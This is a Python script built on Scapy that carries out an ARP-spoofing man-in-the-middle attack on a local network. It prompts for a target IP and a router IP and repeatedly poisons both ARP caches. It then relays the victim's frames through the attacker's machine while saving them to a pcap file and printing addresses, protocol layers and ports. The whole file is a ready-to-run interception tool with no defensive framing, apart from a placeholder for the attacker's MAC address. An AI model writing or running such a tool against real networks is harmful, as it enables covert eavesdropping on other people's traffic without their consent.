from scapy.all import *
from scapy.interfaces import *
from threading import Thread
import logging
import time
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
def fprint(data):
    sys.stdout(data)
 
 
def arp_spoofing():
    eth = Ether()
    arp1 = ARP(pdst=gateway_ip, psrc=target_ip, op="is-at")
    arp = ARP(pdst=target_ip, psrc=gateway_ip, op="is-at")
    packet = eth / arp
    packet1 = eth / arp1
 
    while True:
        sendp(packet, iface=iface, verbose=False)
        sendp(packet1, iface=iface, verbose=False)
        time.sleep(10)
 
 
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
 
    answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    try:
        if answ[0][1].hwsrc is not None:
            return answ[0][1].hwsrc
        else:
            get_mac(ip)
    except:
        get_mac(ip)
 
 
def forward_packet(pkt):
    if pkt[Ether].src == target_mac and pkt[Ether].dst == attacker_mac:
        pkt[Ether].src = attacker_mac
        pkt[Ether].dst = gateway_mac
        sendp(pkt, verbose=False)
    elif pkt[Ether].src == gateway_mac and pkt[Ether].dst == attacker_mac:
        pkt[Ether].src = attacker_mac
        pkt[Ether].dst = target_mac
        sendp(pkt, verbose=False)
    wrpcap(filename, pkt, append=True)
    print(f'-----------------------------------------\nPacket intercepted:\nfrom: {pkt[IP].src}\nto: {pkt[IP].dst}\n')
    layers = []
    for i in range(len(pkt.layers())):
        layers.append(pkt.getlayer(i).name)
    print(f'Network layers: ', end='')
    print(*layers)
    if TCP in pkt:
        print(f'TCP port: {pkt[TCP].dport}')
    print('-----------------------------------------')
 
 
def sniffer():
    sniff(prn=forward_packet, filter=filter, iface=iface)
 
 
iface = get_working_if()
filename = input('Name of .pcap file: ') + '.pcap'
target_ip = input('Target IP in local network: ')
target_mac = get_mac(target_ip)
gateway_ip = input('Router IP in local network: ')
gateway_mac = get_mac(gateway_ip)
attacker_mac = '<YOUR MAC ADDRESS>' # Change it
filter = f'(ip src {target_ip}) or (ip dst {target_ip})'
 
mitm = Thread(target=arp_spoofing, daemon=True)
proxy = Thread(target=sniffer)
proxy.start()
mitm.start()
